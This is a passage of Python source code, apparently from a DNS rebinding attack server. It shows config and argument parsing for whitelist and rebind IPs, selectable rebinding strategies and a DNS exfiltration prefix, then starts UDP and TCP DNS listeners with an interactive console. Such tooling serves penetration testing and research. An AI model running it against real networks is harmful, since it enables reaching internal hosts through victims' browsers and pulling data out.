            if isinstance(args.rebind, str):
                args.rebind = [ip.strip() for ip in args.rebind.split(',')]
            args.server = cfg.get('server')
            args.domain = cfg.get('domain')
            args.port = cfg.get('port', 53)
            args.exfil_prefix = cfg.get('exfil_prefix', 'exfil')
            
            # Parse strategy from config
            strategy_str = cfg.get('strategy', 'count 1')
            parts = strategy_str.split()
            args.strategy = parts
        else:
            return run_setup_wizard()
    
    # Validate required args
    missing = []
    if not args.whitelist:
        missing.append('--whitelist')
    if not args.rebind:
        missing.append('--rebind')
    if not args.server:
        missing.append('--server')
    if not args.domain:
        missing.append('--domain')
    
    if missing:
        parser.error(f'Missing required arguments: {", ".join(missing)}')
    
    # Parse rebind IPs (might already be a list from config file)
    if isinstance(args.rebind, str):
        args.rebind = [ip.strip() for ip in args.rebind.split(',')]
    
    # Parse strategy
    strategy_name = args.strategy[0].lower()
    try:
        strategy_type = StrategyType(strategy_name)
    except ValueError:
        parser.error(f'Unknown strategy: {strategy_name}')
    
    kwargs = {}
    if len(args.strategy) > 1:
        if strategy_type in (StrategyType.COUNT, StrategyType.MULTI_TARGET):
            kwargs['threshold'] = int(args.strategy[1])
        elif strategy_type == StrategyType.TIME:
            kwargs['delay'] = float(args.strategy[1])
        elif strategy_type == StrategyType.RANDOM:
            kwargs['probability'] = float(args.strategy[1])
    
    args.strategy = create_strategy(strategy_type, **kwargs)
    
    return args


def main():
    global config
    
    args = parse_args()

    config = ServerConfig(
        whitelist_ip=args.whitelist,
        rebind_ips=args.rebind,
        server_ip=args.server,
        port=args.port,
        domain=args.domain,
        ttl=args.ttl,
        strategy=args.strategy,
        exfil_prefix=args.exfil_prefix,
    )
    
    print_banner()
    config.logger.info('Server started')
    
    # Shared source tracker for passing client info to resolver
    source_tracker = {}
    
    # Set up DNS server
    factory = LoggingDNSServerFactory(
        clients=[create_resolver(source_tracker)],
        source_tracker=source_tracker
    )
    protocol = LoggingDNSDatagramProtocol(
        controller=factory,
        source_tracker=source_tracker
    )
    
    reactor.listenUDP(config.port, protocol)
    reactor.listenTCP(config.port, factory)
    
    # Set up interactive command interface
    stdio.StandardIO(CommandProtocol())
    
    reactor.run()


if __name__ == '__main__':
    main()
